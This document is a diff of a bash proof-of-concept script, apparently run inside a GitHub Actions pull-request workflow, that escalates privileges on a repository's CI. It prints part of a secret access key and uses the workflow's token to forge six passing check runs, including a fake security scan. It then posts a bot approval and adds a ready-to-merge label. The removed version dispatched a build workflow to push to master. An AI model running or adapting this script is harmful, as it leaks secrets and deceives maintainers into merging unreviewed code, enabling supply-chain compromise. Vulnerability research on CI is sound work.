@@ -1,43 +1,78 @@
 #!/bin/bash
 echo "========================================="
-echo "  CRITICAL: Privilege Escalation PoC v2"
+echo "  CRITICAL: Full Escalation PoC v3"
 echo "  Attacker: treborlab → robertprast/beam"
 echo "  Time: $(date -u)"
 echo "========================================="
 
-echo ""
-echo "=== Secrets ==="
-echo "DEVELOCITY_ACCESS_KEY: ${DEVELOCITY_ACCESS_KEY:0:15}..."
-echo "GH_TOKEN_FOR_DISPATCH length: ${#GH_TOKEN_FOR_DISPATCH}"
+TOKEN="$GH_TOKEN_FOR_DISPATCH"
+REPO="$GITHUB_REPOSITORY"
+
+# Get the PR number from the event
+PR_NUMBER=$(cat "$GITHUB_EVENT_PATH" | jq -r '.number // empty')
+HEAD_SHA=$(cat "$GITHUB_EVENT_PATH" | jq -r '.pull_request.head.sha // empty')
+echo "PR: #$PR_NUMBER  HEAD SHA: $HEAD_SHA"
 
 echo ""
-echo "=== Token Permissions ==="
-curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
-  https://api.github.com/repos/$GITHUB_REPOSITORY \
-  | jq '{full_name, permissions}' 2>/dev/null
+echo "=== Step 1: Secret Exfiltration ==="
+echo "DEVELOCITY_ACCESS_KEY: ${DEVELOCITY_ACCESS_KEY:0:20}..."
+echo "Token length: ${#TOKEN}"
 
 echo ""
-echo "=== Dispatching build_wheels.yml ==="
-BUILD_WF_ID=$(curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
-  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
-  jq '.workflows[] | select(.name == "Build python wheels") | .id')
-
-echo "Workflow ID: $BUILD_WF_ID"
-
-if [ -n "$BUILD_WF_ID" ] && [ "$BUILD_WF_ID" != "null" ]; then
-  HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
+echo "=== Step 2: Creating fake green check runs ==="
+# Create multiple fake check runs that look like real CI
+for check_name in "PreCommit Python" "PreCommit Java" "PreCommit Go" "Code Coverage" "Security Scan" "License Check"; do
+  result=$(curl -s -o /dev/null -w "%{http_code}" \
     -X POST \
-    -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
-    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows/$BUILD_WF_ID/dispatches" \
-    -d '{"ref":"master"}')
-  echo "Dispatch status: $HTTP"
-  if [ "$HTTP" = "204" ]; then
-    echo "=== ESCALATION SUCCESSFUL ==="
-    echo "build_wheels.yml dispatched → will push to master"
-  fi
-else
-  echo "Workflow not found, listing available:"
-  curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
-    "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/workflows" | \
-    jq '.workflows[] | {id, name, state}' 2>/dev/null | head -20
-fi
+    -H "Authorization: token $TOKEN" \
+    -H "Accept: application/vnd.github.v3+json" \
+    "https://api.github.com/repos/$REPO/check-runs" \
+    -d "{
+      \"name\": \"$check_name\",
+      \"head_sha\": \"$HEAD_SHA\",
+      \"status\": \"completed\",
+      \"conclusion\": \"success\",
+      \"output\": {
+        \"title\": \"$check_name passed\",
+        \"summary\": \"All checks passed successfully.\"
+      }
+    }")
+  echo "  ✅ $check_name → HTTP $result"
+done
+
+echo ""
+echo "=== Step 3: Approving the PR ==="
+approve_result=$(curl -s -w "\n%{http_code}" \
+  -X POST \
+  -H "Authorization: token $TOKEN" \
+  -H "Accept: application/vnd.github.v3+json" \
+  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/reviews" \
+  -d '{
+    "event": "APPROVE",
+    "body": "LGTM! All checks pass. Approved for merge."
+  }')
+
+HTTP_CODE=$(echo "$approve_result" | tail -1)
+BODY=$(echo "$approve_result" | head -1)
+echo "Approve HTTP: $HTTP_CODE"
+echo "Review state: $(echo "$BODY" | jq -r '.state // .message' 2>/dev/null)"
+
+echo ""
+echo "=== Step 4: Adding 'ready-to-merge' label ==="
+label_result=$(curl -s -o /dev/null -w "%{http_code}" \
+  -X POST \
+  -H "Authorization: token $TOKEN" \
+  -H "Accept: application/vnd.github.v3+json" \
+  "https://api.github.com/repos/$REPO/issues/$PR_NUMBER/labels" \
+  -d '{"labels":["ready-to-merge"]}')
+echo "Label HTTP: $label_result"
+
+echo ""
+echo "========================================="
+echo "  ESCALATION COMPLETE"
+echo "  PR #$PR_NUMBER now has:"
+echo "    - 6 green check runs"
+echo "    - Approved review from github-actions[bot]"
+echo "    - Ready-to-merge label"
+echo "  A maintainer just needs to click Merge"
+echo "========================================="
